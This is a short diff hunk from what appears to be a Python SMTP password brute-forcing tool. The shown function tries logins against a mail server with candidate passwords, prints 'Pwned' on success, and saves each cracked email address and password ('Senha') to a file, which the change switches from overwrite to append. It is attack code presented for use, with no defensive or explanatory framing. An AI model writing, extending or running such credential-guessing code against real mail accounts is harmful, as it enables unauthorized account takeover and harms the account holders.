@@ -43,8 +43,8 @@ def brute(i):
   
   try:
     smptserver.login(user, ii)
-    print("\n\t[{} INFO] Pwned: {}:{}\n\n".format(tempo, user, ii))
-    arq = open("pwned-email.txt", "w")
+    print("\n\n\t[{} INFO] Pwned: {}:{}\n".format(tempo, user, ii))
+    arq = open("pwned-email.txt", "a")
     arq.write("Email: {} Senha: {}".format(user, ii))
     arq.close()
   except smtplib.SMTPAuthenticationError:
